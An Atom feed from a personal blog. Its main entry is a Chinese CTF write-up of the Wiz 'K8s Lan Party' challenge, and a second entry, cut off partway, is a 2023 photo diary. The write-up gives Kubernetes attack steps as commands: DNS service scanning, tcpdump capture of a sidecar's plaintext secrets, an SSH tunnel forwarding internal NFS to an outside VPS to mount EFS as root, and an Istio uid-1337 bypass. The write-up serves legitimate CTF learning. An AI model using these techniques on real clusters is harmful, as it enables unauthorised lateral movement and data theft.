<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DV.K</title>
  
  
  <link href="http://blog.dvkunion.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.dvkunion.cn/"/>
  <updated>2024-03-18T17:47:44.439Z</updated>
  <id>http://blog.dvkunion.cn/</id>
  
  <author>
    <name>DV.K</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>K8s-Lan-Party</title>
    <link href="http://blog.dvkunion.cn/2024/03/19/K8sLanParty/"/>
    <id>http://blog.dvkunion.cn/2024/03/19/K8sLanParty/</id>
    <published>2024-03-19T09:30:00.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>K8s Lan Party</h1><!-- split --><p>很久没写实际的技术相关的文章了，加上最近忙于工作忙于开源项目忙于生活上的各种琐事，完全抽不出自己的时间来做一些事情。<br>但还是硬挤着时间尝试做了一下 wiz 的这一期挑战赛，熬了两晚加上激情 py 之后，总算也是 AK 了，三月终于能水一篇文章了。 QAQ<br>WP 整体上我会更偏向于自己做题思考的过程，而不是基础的知识点与考点内容，实际上知识点的讲解我自己的基础也并不是很好，其他的师傅们的<br>WP 我觉得可能会好的很多。所以我更倾向于讲解一下在做题时自己的一些思考过程，包括试错的过程，把每一个 challenge<br>当成一个真实的渗透测试来做。</p><span id="more"></span><h2 id="01-Recon-侦查">01.Recon - 侦查</h2><p>签到题整体的思路还是比较明确连贯的。首先我们看一下题目给了什么：</p><blockquote><p>You have compromised a Kubernetes pod, and your next objective is to compromise other internal services further.<br>As a warmup, utilize DNS scanning to uncover hidden internal services and obtain the flag. We have preloaded your<br>machine with dnscan to ease this process for further challenges.<br>All the flags in the challenge follow the same format: wiz_k8s_lan_party{*}.</p></blockquote><p>看不懂没关系，人工智能时代这些都不是问题，简要的让 GPT 翻译一下大意就是，在云环境下，你已经拿到了一个 pod 的 shell<br>权限。现在要开始横向移动，来获取更多的权限和影响。</p><p>同时题目还人性化的提示了使用 DNS 进行扫描，还准备了 DNS<br>扫描工具以简化上传工具的步骤。除此之外，还放出了两个链接：<a href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">Kubernetes DNS</a>、<a href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e">DNScan 源码</a></p><p>如果在日常的渗透测试或漏洞挖掘中遇到过集群容器环境，那么很容易在这里联想到，我们拿到了一个 pod<br>的权限后，与在传统环境下进行渗透时的思路是一致的，当本地的权限已足够高或当前的环境提权无望时，最常见的就是对网络进行探测，从而实现横向的移动扩散。</p><p>与主机不同的是，主机的场景下，我们通常是对主机的网卡 C段/B段发起端口扫描或存活探测；而在 k8s 集群环境中，相较于 IP<br>扫描，有一种更为有效的服务探测方式，便是通过 k8s service dns<br>来对存活的服务进行探测；其<a href="https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/">原理</a>是 k8s 在创建<br>pod 和 service 时，会自动的创建一条内置的 dns<br>记录，以便运行的容器可以按名称而不是IP查找服务。通常，这个域名的格式为：<code>&lt;pod-ip&gt;.&lt;namespace&gt;.pod.cluster.local</code></p><p>在了解了这些基础知识后，回到这一题；明显出题人期望我们通过探测服务，从其他的服务中来获取到这个 flag; 并人性化的提示了我们使用<br>dnscan 扫描。</p><p>但是这个工具我们没用过，直接尝试使用来扫描 <code>*.cluster.local.svc </code>报错，怎么办呢？</p><p>通常遇到不会用的工具，除了看其源码之外，还可以通过 <code>-h/--help</code> 尝试获取帮助，或通过 <code>man</code> 手册来查看。</p><p><code>dnscan -h</code></p><p><img src="https://blog.dvkunion.cn/img/95ea4bb72cf64e88874d130b9cbb18ab.png" alt="c1-1"></p><p>这里提示我们使用的是一个 CIDR 的 IP 范围，而不是域名；通过源码也可以查看到，实际上做了一个对给出的 IP<br>段进行 <a href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e#file-dnscan-go-L19"><code>net.LookupAddr</code></a> 的操作</p><p>由此我们改变策略：要去扫一个 IP 段，该扫哪个 IP 呢？ 常用的思路有：网卡 IP 所在的网段、网关所在的网段、K8s APIServer 所在的网段等等。</p><p>依次的进行尝试，最开始我是指扫了 /24 ， 结果发现效果并不好；返回去读了一遍工具代码后直接上到 /16 暴力的去跑了，最终，我们成功的探测到了一个服务：</p><p><img src="https://blog.dvkunion.cn/img/ba9bf32a935044d2a827d5394a0fd904.png" alt="c1-2"></p><p>那么对这个服务，最常见的，我们尝试 curl 进行访问：</p><p><code>curl getflag-service.k8s-lan-party.svc.cluster.local</code></p><p>即可得到 flag</p><blockquote><p>总结：本题主要考察了在日常的渗透中，如何进行横向移动的 dns 扫描操作。</p></blockquote><h2 id="02-Finding-Neighbours-找到邻居">02.Finding Neighbours - 找到邻居</h2><p>依旧还是先读题：</p><blockquote><p>Sometimes, it seems we are the only ones around, but we should always be on guard against invisible sidecars reporting<br>sensitive secrets.</p></blockquote><p>部署过一些 k8s 服务的同学，可能会对这个 <code>sidecars</code> 比较敏感，如果对这个不熟悉，我们依旧可以从描述中找出自己最不熟悉、最像专属名词的词语丢个<br>GPT 来给我们解释：</p><p><img src="https://blog.dvkunion.cn/img/a9f207c877944c49a1965a5159dd0daa.png" alt="c2-1"></p><p>GTP 给出了一个很关键的核心：共享网络。而我们此次的挑战赛正是与网络相关，是否这就是这道题的考点呢？</p><p>回到环境中来，首先是日常容器中的 3W 原则：我是谁(whoami)，我在哪(where am i)、我有什么权限(what privileged i have)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef</span><br><span class="line">cat /proc/1/cgroup</span><br><span class="line">cat /proc/1/status</span><br></pre></td></tr></table></figure><p>由此基本可以判断出，我们是在一个 pod 内、仅仅包含了网络权限的普通账户，并且该环境下并没有什么值得关注的进程信息。</p><p>我们再次读取题干，很大概率可以猜测，这题是让我们找到对应的 sidecar，然后在 sidecar 中发现我们的 flag。那么就回到第一题的网络原则：</p><p>网卡 IP 所在的网段、网关所在的网段、K8s APIServer 所在的网段开扫：<br>最终还是暴力出奇迹，发现了名为：<code>reporting-service.k8s-lan-party.svc.cluster.local</code>的服务。</p><p><img src="https://blog.dvkunion.cn/img/cbe3b5fc502a421f9c0db3dd015d51dd.png" alt="c2-2"></p><p>但是我们的请求发现，对方并没有如愿的把 flag 直接返回给我；经过不断的尝试，这个服务不论什么请求都是没有任何回应的 200。</p><p>怎么办呢？我们重换策略；重新刷新后进入新的题目环境，直接观察对应的网络环境：</p><p><code>watch netstat -natpul</code></p><p><img src="https://blog.dvkunion.cn/img/456397740b874588a8537085955b41d9.png" alt="c2-3"></p><p>我们发现，这个 pod 会不断的向一个 IP 发起 TCP 请求；而这个 IP 刚好就是我们刚刚发现的 IP。</p><p>这种巧合，很难不让人去猜测他到底在做什么？于是我们尝试对这个请求进行抓包：</p><p><code>tcpdump host 10.100.171.123 -w 1.pcap</code></p><p><img src="https://blog.dvkunion.cn/img/63e734f6e0f44cd7a33388bd9afeab5f.png" alt="c2-4"></p><p>等待几秒后，我们直接从流量包中获取到了明文的 flag 信息。</p><blockquote><p>总结：在第一题的基础上，考察了对网络的敏感性与抓包的基本功；<br>除此之外，这题还给了我们一个很大的警示：HTTP 服务会暴露明文传输的敏感信息</p></blockquote><h2 id="03-DATA-LEAKAGE">03.DATA LEAKAGE</h2><p>这题我整体的思路完全炸了，导致卡了一整天，最后还是 PY 了一下思路才转过头来...只能说有的时候想的太多，并不是什么好事。</p><p>首先题干中比较明确的指出了：网络存储。</p><p>那么我们首先查看一下当前环境，发现了一个 efs，并且在 efs 下，存在我们目标的 flag 文件。</p><p><code>cat /proc/1/mountinfo</code></p><p><img src="https://blog.dvkunion.cn/3cb3e854a44447649a917f7dc7b0b161.png" alt="c3-1"></p><p>说到网络存储，如果你是一个主机玩家，那么对 nas 一定不陌生。 在 nas 配置的时候，也会常常遇到一个问题：nas 是基于 unix 实现的文件<br>acl 权限管控，也就是说，文件的权限校验只与 uid/gid 有关。</p><p>结合<a href="https://docs.aws.amazon.com/zh_cn/efs/latest/ug/accessing-fs-nfs-permissions.html">efs的官方提示</a>：</p><p><img src="https://blog.dvkunion.cn/img/6dadd77fbe2948d3ba9747dffa2cb5d7.png" alt="c3-2"></p><p>我们可知，在通过 nfs 挂载 efs 的时候，efs 自身的校验不会生效，而是完全信任客户端的权限校验，也就是 nfs 的认证。</p><p>所以，只要我们能保证自己的 uid/gid 为 1，即可查看这个文件。</p><p>所以，我的想法是，通过 usernamespace 创建一个假的命名环境空间，让 uid/gid=1.</p><p>然后这题就做不动了。。。尝试各种办法伪造 uid(unshare 没有<br>uid_map的写权限、尝试修改默认的内核参数/proc/sys/kernel/overflowuid等等)</p><p>基本没有作用，因为题目的权限只有 caps_net_admin / caps_net_raw... 只有网络操作相关的权限。</p><p>由此重新挂载来实现这个目录的权限变更也不现实，<code>mount</code> 需要更高的权限。</p><p>可是如何能通过网络来实现将自身 uid/gid 的修改呢？难道我们要解析捕获 nfs 的协议然后修改包吗？</p><p>在尝试写了大量的抓包、改包、以及解决上传过大文件导致断流 limit 的问题等，我觉得这个题目的思考点肯定是错了。</p><p>本着节约时间的思想，PY 了一下hint (by <a href="https://github.com/Esonhugh">@Esonhugh</a>), 原来：</p><blockquote><p>&quot;棋盘内的胜负有时候是在棋盘外&quot;</p></blockquote><p><img src="https://blog.dvkunion.cn/img/0386daa74c7f4f16a7581760befedef2.png" alt="c3-3"></p><p>既然容器内权限不够、无法挂载，那么只要我在容器外是不是就有权限挂载、有权限以更高的unix 账户来访问文件？</p><p>由此，整个问题就变成了：如何在外部访问到这个容器内理应才能够访问到的域名？</p><p>答案自然是：流量转发。</p><p>这里就不再多赘述如何实现流量转发的问题了，只需要把服务通过隧道转发到外部的 vps 中即可。</p><p>这里使用最简单的 ssh 隧道转发:</p><p><code>ssh -L 2049:192.168.124.98:2049 -o StrictHostKeyChecking=no -N root@&lt;vps_ip&gt;</code></p><p>192.168.124.98 是通过 mountinfo 查看到的(cat /proc/1/mountinfo); 2049 是 nfs 服务默认端口。</p><p>这样，我们在自己的 vps 上执行 mount 动作，即可成功以 root 账户挂载一个新的 efs 目录，然后成功获取到 flag。</p><h2 id="04-ByPassing-Boundaries-绕过边界">04.ByPassing Boundaries - 绕过边界</h2><p>这题由于我非预期了。。。就没怎么看，所以预期解没什么思考的部分，也没花什么时间去研究，正解纯粹 PY 来的(<br>by <a href="https://github.com/Esonhugh">@Esonhugh</a>)</p><p><a href="https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables">hint</a> 提示到，让我们观察<br>istio 的 iptables 规则：</p><p>我们可以注意到一个有趣的声明：</p><p><img src="https://blog.dvkunion.cn/img/f9b5bad4292b41b5a3984eba2ccdae46.png" alt="c4-1"></p><p>同时官方的<a href="https://github.com/istio/istio/issues/4286">ISSUE</a> 中也提到了这一个。</p><p>并且在这个题目中，我们是一个 root 账号，在确认权限后，具有 caps_setuid 和 caps_setgid 的能力。</p><p>那么依旧首先探测网络，捕捉到一个 <code>istio-protected-pod-service.k8s-lan-party.svc.cluster.local</code> 服务，但是直接请求会发现：</p><p><img src="https://blog.dvkunion.cn/img/01965762d9cb41d0934e189bea8a80e9.png" alt="c4-2"></p><p>让我们切换到神奇的 1337 uid中：</p><p><code>su istio</code></p><p><img src="https://blog.dvkunion.cn/img/780820915be046468ccdb2ae39516383.png" alt="c4-3"></p><p>再次请求，我们发现，原本不通的网络已经通了。</p><p>结合文档，可知：在 istio 中 ，1337 用户的流量不会过到 envoy 中，从而可以绕过防火墙策略；由此，在 istio 环境下的 pod 内使用<br>root 权限来运行容器是十分危险的。</p><h2 id="04-ex-ByPassing-Boundaries-的非预期">04-ex.ByPassing Boundaries 的非预期</h2><p>非预期讲起来也好笑，在发现网络不通后，没有读hint，也没什么思路，就去做第五题了。</p><p>结果实际上，在第五题的网络中，这个请求是直接通的。。。你可以直接在题5的终端中执行：</p><p><code>curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local</code></p><p>怀疑是策略没有设置。。。或是其他原因，官方发送的邮件也米有回应。。。</p><h2 id="05-Lateral-Movement-横向移动">05.Lateral Movement - 横向移动</h2><p>这题我完全没有考虑出有什么考点，就是根据提示以学习的思路去做硬拼出来的，感觉整体上这题与前四题有些脱节。</p><p>首先是题到的一个新资源：<code>kyverno.io/v1.Policy</code>，初步搜索一下，即可找到 kyverno 这个项目。</p><p>然后依旧是题 1 的网络探测，可以发现如下服务：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">10.100.86.210 -&gt; kyverno-cleanup-controller.kyverno.svc.cluster.local.</span><br><span class="line">10.100.126.98 -&gt; kyverno-svc-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.158.213 -&gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.171.174 -&gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.217.223 -&gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.232.19 -&gt; kyverno-svc.kyverno.svc.cluster.local.</span><br></pre></td></tr></table></figure><p>再看给出的 policy 的描述：这是一个 <code>mutate</code> 规则，在 kyverno 的仓库中尝试搜索：<code>/mutate</code>, 找到了对应服务的路由。</p><p>如果你没有看出需要查找 <code>mutate</code> 的路由这一步，实际上，通过 <code>metrics</code> 也能看到其他大佬的请求日志，找到数量非1次的那种评估一下，大概率就是答案的路由, 这也是常见的 metrics 信息泄漏的问题。</p><p><code>curl kyverno-svc-metrics.kyverno.svc.cluster.local:8000/metrics</code></p><p>在获取到路由后，我们可以知道，这是一个 POST 请求，当我们构造的 <code>AdmissionReview</code> 符合其规则 <code>apply-flag-to-env</code> 时，服务会把flag 通过 env 塞到我们的请求结构中。</p><p>最终这道题就转化为了，如何构造一个 AdmissionReview 的 json，来获取这个 env。</p><p>如果你对 k8s admission webhook 熟悉的话，可以快速的构造出一个：<a href="http://admission.k8s.io/v1beta1">admission.k8s.io/v1beta1</a> 的结构；也可以通过go导入对应的struct来快速反序列化一个json。</p><p>最终只要满足： namespace 为 sensitive-ns、kind 为 POD、动作为 CREATE/UPDATE 、不能让服务产生空指针问题(坑，kyverno在取值时很多字段容易出现空指针，必须要为其提供对应的字段，否则会出现 curl: (92) HTTP/2 stream 0 was not closed cleanly: INTERNAL_ERROR (err 2) )</p><p>所以这题就是一个按照手册 拼请求的一道题。。。完全没有需要深究为什么的思路了。。。</p><h2 id="结尾语">结尾语</h2><p>总体来说，这一次挑战的题目，除了最后一题之外，个人感觉还是很有趣的，对整体的思维、实战理解、以及一些常用基本功如抓包、转发等等，都有涉及。</p><p>涉及到的知识点也比较有趣，基本文献都是国外才能看得到的，在国内没有对这些 feature 进行利用的文章。</p><p>只能说，革命尚未成功，云安全的同志们仍需要继续一起努力！</p><p><img src="https://blog.dvkunion.cn/img/e23d2f457cde4fa5a52e379454f8e967.png" alt="cert"></p><h4 id="参考链接">参考链接</h4><blockquote><p>0.Kubernetes DNS : <a href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue</a><br>1.DNScan 源码 : <a href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e">https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e</a><br>2.原理 : <a href="https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/">https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/</a><br>4.<code>net.LookupAddr</code> : <a href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e#file-dnscan-go-L19">https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e#file-dnscan-go-L19</a><br>11.efs的官方提示 : <a href="https://docs.aws.amazon.com/zh_cn/efs/latest/ug/accessing-fs-nfs-permissions.html">https://docs.aws.amazon.com/zh_cn/efs/latest/ug/accessing-fs-nfs-permissions.html</a><br>13.@Esonhugh : <a href="https://github.com/Esonhugh">https://github.com/Esonhugh</a>)<br>15.hint : <a href="https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables">https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables</a><br>17.ISSUE : <a href="https://github.com/istio/istio/issues/4286">https://github.com/istio/istio/issues/4286</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;K8s Lan Party&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;p&gt;很久没写实际的技术相关的文章了，加上最近忙于工作忙于开源项目忙于生活上的各种琐事，完全抽不出自己的时间来做一些事情。&lt;br&gt;
但还是硬挤着时间尝试做了一下 wiz 的这一期挑战赛，熬了两晚加上激情 py 之后，总算也是 AK 了，三月终于能水一篇文章了。 QAQ&lt;br&gt;
WP 整体上我会更偏向于自己做题思考的过程，而不是基础的知识点与考点内容，实际上知识点的讲解我自己的基础也并不是很好，其他的师傅们的&lt;br&gt;
WP 我觉得可能会好的很多。所以我更倾向于讲解一下在做题时自己的一些思考过程，包括试错的过程，把每一个 challenge&lt;br&gt;
当成一个真实的渗透测试来做。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
    <category term="K8s" scheme="http://blog.dvkunion.cn/tags/K8s/"/>
    
  </entry>
  
  <entry>
    <title>感谢2023所有出镜人员</title>
    <link href="http://blog.dvkunion.cn/2023/12/30/%E6%84%9F%E8%B0%A22023%E6%89%80%E6%9C%89%E5%87%BA%E9%95%9C%E4%BA%BA%E5%91%98/"/>
    <id>http://blog.dvkunion.cn/2023/12/30/%E6%84%9F%E8%B0%A22023%E6%89%80%E6%9C%89%E5%87%BA%E9%95%9C%E4%BA%BA%E5%91%98/</id>
    <published>2023-12-30T23:05:06.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>&quot;感谢2023所有出镜人员&quot;</h1><p>赶在 2023 的尾巴补交上这一年的年度报告～</p><h2 id="一月">一月</h2><h4 id="2023-年的开始是从-盖茨比-与我的举杯开始的。">2023 年的开始是从 盖茨比 与我的举杯开始的。</h4><p><img src="https://blog.dvkunion.cn/img/5b6cf95f660f489fac053fc0df831c88.jpg" alt="2023-01-01"></p><h4 id="快过年了，每年的这时候都掏出了这张图">快过年了，每年的这时候都掏出了这张图</h4><p><img src="https://blog.dvkunion.cn/img/18a68a71c62a40868972ba7bd467fea6.png" alt="2023-01-10"></p><h4 id="给出租屋贴了春联～">给出租屋贴了春联～</h4><p><img src="https://blog.dvkunion.cn/img/ecf4bfb026f54088b346a88e6c880a88.png" alt="2023-01-14"></p><h4 id="回家过年">回家过年</h4><p><img src="https://blog.dvkunion.cn/img/db6385549b0340d6b95ccd8578cae936.png" alt="2023-01-20"></p><h4 id="家里肥硕的小花">家里肥硕的小花</h4><p><img src="https://blog.dvkunion.cn/img/75eea41a31a14fddb7af8a37f0d48131.png" alt="2023-01-21"></p><h2 id="二月">二月</h2><h4 id="买到了属于自己小摩托啦">买到了属于自己小摩托啦</h4><p><img src="https://blog.dvkunion.cn/img/199aae2d99b743ed8397e421f4248dec.png" alt="2023-02-11"></p><h4 id="情人节限定皮肤">情人节限定皮肤</h4><p><img src="https://blog.dvkunion.cn/img/c59b85a454dc4b9696361a8c95834779.png" alt="2023-02-14"></p><h4 id="忧郁的猫猫头">忧郁的猫猫头</h4><p><img src="https://blog.dvkunion.cn/img/f9ad2beba040452ab6b91007efeceb97.png" alt="2023-02-15"></p><h4 id="喝酒">喝酒</h4><p><img src="https://blog.dvkunion.cn/img/0b430d0bac93432fa65e36f391239695.png" alt="2023-02-18"></p><h2 id="三月">三月</h2><h4 id="人生和酒">人生和酒</h4><p><img src="https://blog.dvkunion.cn/img/abd7db3398944519bce4001434ad5086.png" alt="2023-03-04"></p><h4 id="川渝之旅，庆祝猪蹄生日">川渝之旅，庆祝猪蹄生日</h4><p><img src="https://blog.dvkunion.cn/img/d8c7bdebfcc0426f990f1ddf601323df.png" alt="2023-03-17"></p><h4 id="铃芽之旅">铃芽之旅</h4><p><img src="https://blog.dvkunion.cn/img/d33c7db2f55a4b7d99a96c7ac8cc353e.png" alt="2023-03-26"></p><h2 id="四月">四月</h2><h4 id="骑摩托去青山湖吹了一脸灰">骑摩托去青山湖吹了一脸灰</h4><p><img src="https://blog.dvkunion.cn/img/7d768d426e914323a8a1dab7fc5ebf3f.png" alt="2023-04-02"></p><h4 id="忘记了为了庆祝什么的喝酒">忘记了为了庆祝什么的喝酒</h4><p><img src="https://blog.dvkunion.cn/img/7765671ee4524870987e8c4fb239752b.png" alt="2023-04-08"></p><h4 id="新世纪社畜战士">&quot;新世纪社畜战士&quot;</h4><p><img src="https://blog.dvkunion.cn/img/ebae39b9770f48328d103f7a9c6288fa.png" alt="2023-04-11"></p><h4 id="好像是为了庆祝要搬家了，喝酒">好像是为了庆祝要搬家了，喝酒</h4><p><img src="https://blog.dvkunion.cn/img/09aca77b357f4c0299baabb1fa75dea9.jpg" alt="2023-04-14"></p><h4 id="免费的回春丹，对不起刘西蒙">免费的回春丹，对不起刘西蒙</h4><p><img src="https://blog.dvkunion.cn/img/d3133405308e4655830e5b134a2e56d8.png" alt="2023-04-15"></p><h4 id="我买光所有的炸药，却还是炸不掉他给你的碉堡">&quot;我买光所有的炸药，却还是炸不掉他给你的碉堡&quot;</h4><p><img src="https://blog.dvkunion.cn/img/2301efd7b9d1418fb923fb4f88bf7bc3.png" alt="2023-04-15"></p><h4 id="搬家收拾的手办">搬家收拾的手办</h4><p><img src="https://blog.dvkunion.cn/img/29d7b41ecc2f4b989ad7be14db321299.png" alt="2023-04-16"></p><h4 id="新家军火展示">新家军火展示</h4><p><img src="https://blog.dvkunion.cn/img/da16202b2fdc4869a36b1cf4a66ba32e.png" alt="2023-04-22"></p><h4 id="以及入门的留言板">以及入门的留言板</h4><p><img src="https://blog.dvkunion.cn/img/8486a9f9fbe044fcbfb6d0706e8b8643.png" alt="2023-04-22"></p><h4 id="还不太适应新家的贴贴">还不太适应新家的贴贴</h4><p><img src="https://blog.dvkunion.cn/img/d308c0f8b0e3445fa6775b3a009cde73.png" alt="2023-04-30"></p><h2 id="五月">五月</h2><h4 id="尝试给新家补墙">尝试给新家补墙</h4><p><img src="https://blog.dvkunion.cn/img/5a71f1a16cff47ca8fb5bcf018e68577.png" alt="2023-05-01"></p><h4 id="收拾好的小电竞屋">收拾好的小电竞屋</h4><p><img src="https://blog.dvkunion.cn/img/91aed71be4e94c09bcb63fd9507ae602.png" alt="2023-05-02"></p><h4 id="很快适应了新家的贴贴">很快适应了新家的贴贴</h4><p><img src="https://blog.dvkunion.cn/img/7631f140f6294443a369ba0bdaebeea3.png" alt="2023-05-03"></p><h4 id="发售就买了但是直到年底进度还在新手村的王国之泪">发售就买了但是直到年底进度还在新手村的王国之泪</h4><p>那我为什么要买首发呢?</p><p><img src="https://blog.dvkunion.cn/img/7ea06f00cb0c443bbca0558534a044f1.png" alt="2023-05-13"></p><h4 id="尚未脱离城市的露营">尚未脱离城市的露营</h4><p><img src="https://blog.dvkunion.cn/img/b6a0c9619ff744f3a302a433f2b2ef58.png" alt="2023-05-19"></p><h4 id="还有酒">还有酒</h4><p><img src="https://blog.dvkunion.cn/img/65a75e161cce4f348cc6421edd5a7774.png" alt="2023-05-20"></p><h4 id="来自父母的爱">来自父母的爱</h4><p><img src="https://blog.dvkunion.cn/img/b04a37b9c36b4d7a9b81b682b2ddbb3a.png" alt="2023-05-28"></p><h2 id="六月">六月</h2><h4 id="成年人过儿童节的方式">成年人过儿童节的方式</h4><p><img src="https://blog.dvkunion.cn/img/4b53d2b942e4474b96e23ad7a75c5af6.png" alt="2023-06-01"></p><h4 id="摩托-2023-公里留念">摩托 2023 公里留念</h4><p><img src="https://blog.dvkunion.cn/img/31f8b4f2599343108686d9b74ce64c18.png" alt="2023-06-13"></p><h4 id="偶遇兄弟">偶遇兄弟</h4><p><img src="https://blog.dvkunion.cn/img/4ab19bb2999142f7ba2f8128e21bcc68.png" alt="2023-06-15"></p><h4 id="又是忘记为什么的喝酒">又是忘记为什么的喝酒</h4><p><img src="https://blog.dvkunion.cn/img/971f8433a9364a9e8c7907045a36591e.png" alt="2023-06-16"></p><h4 id="治愈冰箱的最好方式">治愈冰箱的最好方式</h4><p><img src="https://blog.dvkunion.cn/img/22c3a9761ab04222a07718cfc048fc54.png" alt="2023-06-30"></p><h2 id="七月">七月</h2><h4 id="去对象家喝酒">去对象家喝酒</h4><p><img src="https://blog.dvkunion.cn/img/23a624f12ad04840948fc951dd71f2bf.png" alt="2023-07-01"></p><h4 id="应-冰总邀请，在各位大佬面前班门弄斧的做了分享。">应@冰总邀请，在各位大佬面前班门弄斧的做了分享。</h4><p><img src="https://blog.dvkunion.cn/img/49fc4d3dd3ef40bd9ad201e2c07a47dc.png" alt="2023-07-04"></p><h4 id="来了趟很久没光临的余欢-一壶浊酒尽余欢">来了趟很久没光临的余欢, &quot;一壶浊酒尽余欢&quot;</h4><p><img src="https://blog.dvkunion.cn/img/a7de992119e34685a1aab7aca9af36e7.png" alt="2023-07-08"></p><h4 id="不知道配什么的图-单纯想放一下">不知道配什么的图, 单纯想放一下</h4><p><img src="https://blog.dvkunion.cn/img/95351f55244b44f494ddf9d6a794f517.png" alt="2023-07-14"></p><h4 id="家庭新成员，凑凑的加入">家庭新成员，凑凑的加入</h4><p><img src="https://blog.dvkunion.cn/img/870303dc88a54126be0352d6c7f2ad0d.png" alt="2023-07-15"></p><p><img src="https://blog.dvkunion.cn/img/be2d244c3f924d9aa934b4446784f1ce.png" alt="2023-07-15"></p><h4 id="熬夜补-我推的孩子">熬夜补 &quot;我推的孩子&quot;</h4><p><img src="https://blog.dvkunion.cn/img/68d926c759db4309b9194f6dfe3ca1b9.png" alt="2023-07-16"></p><p><img src="https://blog.dvkunion.cn/img/63c22c5043144c76acc416b75f9e7d80.png" alt="2023-07-16"></p><h4 id="我的生日礼物">我的生日礼物</h4><p><img src="https://blog.dvkunion.cn/img/0b0cd7a73dfa4037a4ad2a19cd15b0d7.png" alt="2023-07-23"></p><h2 id="八月">八月</h2><h4 id="看寂静岭壮胆开酒">看寂静岭壮胆开酒</h4><p><img src="https://blog.dvkunion.cn/img/60399693bce44a79836d901f8266a283.png" alt="2023-08-12"></p><h4 id="收到了-Kcon-兵器谱上榜的海报～">收到了 Kcon 兵器谱上榜的海报～</h4><p><img src="https://blog.dvkunion.cn/img/51eef825163447efb87e16f1ba75dc55.png" alt="2023-08-15"></p><h4 id="新到的精酿，尝尝">新到的精酿，尝尝</h4><p><img src="https://blog.dvkunion.cn/img/6b3af775f11b4955b02ab2a8b69a730c.png" alt="2023-08-20"></p><h4 id="捣鼓起来的洋垃圾">捣鼓起来的洋垃圾</h4><p><img src="https://blog.dvkunion.cn/img/96e2573ec8e647229704a994b6dc6646.png" alt="2023-08-21"></p><h4 id="有幸参加成都-ccs-大会分享～遇到了很多好玩的有趣的朋友">有幸参加成都 ccs 大会分享～遇到了很多好玩的有趣的朋友</h4><p><img src="https://blog.dvkunion.cn/img/159af6341c654141812d46aa28820c5a.png" alt="2023-08-25"></p><h2 id="九月">九月</h2><h4 id="秋初的骑行上山-东明山公园">秋初的骑行上山 - 东明山公园</h4><p><img src="https://blog.dvkunion.cn/img/b139f9c4d1024ec49921229163e49220.png" alt="2023-09-03"></p><h4 id="大阪-奈良之旅">大阪-奈良之旅</h4><p><img src="https://blog.dvkunion.cn/img/a594b3789efe46409e0516ddfd96bdbc.png" alt="2023-09-14"></p><p><img src="https://blog.dvkunion.cn/img/47128079078f49e9a0d016158cfa762c.png" alt="2023-09-14"></p><p><img src="https://blog.dvkunion.cn/img/be18d41404ee4012bbebdab46d3d6f33.png" alt="2023-09-14"></p><h4 id="花火大会">花火大会</h4><p><img src="https://blog.dvkunion.cn/img/c31f9d03ec3b42c68c83e0fdb231484f.jpg" alt="2023-09-17"></p><p><img src="https://blog.dvkunion.cn/img/023448bfffbd42a18038ea22bc47d659.png" alt="2023-09-17"></p><h2 id="十月">十月</h2><h4 id="回家-日出和科罗纳">回家 日出和科罗纳</h4><p><img src="https://blog.dvkunion.cn/img/7429bd0d862146ec92d482f287d7efd0.png" alt="2023-10-03"></p><h4 id="补番-夏日重现">补番 夏日重现</h4><p><img src="https://blog.dvkunion.cn/img/e7e03d423e2249d8983389325aa91909.png" alt="2023-10-16"></p><h4 id="公司团建">公司团建</h4><p><img src="https://blog.dvkunion.cn/img/021a2b99e78d4035b61d660f1c7f8089.png" alt="2023-10-20"></p><h4 id="日渐茁壮的凑凑">日渐茁壮的凑凑</h4><p><img src="https://blog.dvkunion.cn/img/29917b266aa94afe9d83a548268cf4f3.png" alt="2023-10-22"></p><h4 id="杭州乐园-万圣节">杭州乐园 - 万圣节</h4><p><img src="https://blog.dvkunion.cn/img/3dc8a15cc28d44c48d95cc5efc44bcf1.png" alt="2023-10-28"></p><h4 id="每月的酒">每月的酒</h4><p><img src="https://blog.dvkunion.cn/img/4f6c6446e2424377a259be5da094dc50.png" alt="2023-10-29"></p><h2 id="十一月">十一月</h2><h4 id="凑凑已经胖的变形了">凑凑已经胖的变形了......</h4><p><img src="https://blog.dvkunion.cn/img/9589bb9fea5945f4966f766ba4ec3dc2.png" alt="2023-11-15"></p><h4 